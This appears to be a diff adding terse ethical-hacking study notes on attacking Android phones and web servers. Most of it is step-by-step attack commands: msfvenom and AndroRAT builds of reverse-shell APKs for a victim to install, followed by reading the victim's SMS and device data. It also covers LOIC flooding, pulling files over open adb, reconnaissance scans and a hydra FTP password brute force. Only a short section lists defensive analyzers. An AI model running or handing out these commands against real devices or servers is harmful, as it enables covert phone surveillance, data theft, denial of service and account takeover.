@@ -1,0 +1,102 @@
+Hacking Mobile Platforms
+
+1. Hack
+
+1. Metasploit
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<<ip-address>> R > file.apk
+metasploit
+shared folder
+In Mobile http://ip/share/
+Install apk 
+sysinfo #Computer Name, OS
+ps #List Of Processes Running 
+
+2.Social Engineering Toolkit
+
+3.LOIC. 
+Install LOIC App in Mobile
+Enter Target IP, Port Number, Number Of Threads, TCP.
+Wireshark.
+
+4. Phonesploit.
+cd Phonesploit
+python3 -m pip install colorama
+python3 phonesploit.py
+
+5.AndroRAT: 
+python3 androRAT.py --build -i <<Local IP>> -p << Local Port>> -o <<APK FILE NAME>>
+Share Folder
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+Victim opens application and session is created.
+getMACAddress
+getSMS inbox
+deviceInfo
+
+2. Security.
+
+1. Sisik.eu APK Analyzer. #Analyzes APK.
+2. Malwarebytes Security.
+
+
+3. Adb (Port 5555)
+
+adb devices -l
+
+# Connection Establish Steps
+adb connect <<IP Address>>:5555
+adb devices -l
+adb shell  
+ls
+# Download a File from Android using ADB tool In Linux 
+sudo adb pull /folderpath 
+
+Windows 
+adb root
+adb pull foldername 
+adb push filename folder path
+ent file.elf
+
+sha384sum
+
+
+Hacking Web Servers
+
+1.Information Gathering
+1. Ghosteye
+python3 ghosteye.py
+
+2. Skipfish
+
+skipfish -o <<path to store output>> -S /usr/share/skipfish/dictionaries/complete.wl <<domain name>>
+
+3. HTTPRecon Tool  #HTTP Protocol And Its Version
+4.IDServe  #Server Information.
+
+5. Netcat
+netcat -vv <<Domain Name>> 80
+GET /HTTP/1.0
+
+Telnet
+telnet <<Domain Name>> 80
+GET /HTTP/1.0
+
+
+6. NMAP Script Engine
+nmap -sV --script=http-enum <<Domain Name>>  #OS Details
+nmap --script hostmap-bfk --script-args hostmap-bfk.prefix=hostmap- <<domain name>>  #Hostname
+nmap --script http-trace -d <<Domain Name>>  #Trace Method Enabled Or Not.
+nmap --script -p80 http-waf-detect <<Domain Name>> #Detect WAF Is Used Or Not.
+
+7. Uniscan
+uniscan -u <<domain name>> -q  #Directory Enumeration
+uniscan -u <<domain name>> -we #file checks (robots.txt, sitemap.xml)
+uniscan -u <<domain name>> -d #Dynamic Scan.
+
+
+Perform:
+1. FTP .
+nmap -p 21 <<ip address>>
+ftp <<ip address>>
+hydra -L <<Username Wordlist>> -P <<Password Wordlist>> ftp://<<IP Address>>
+
+
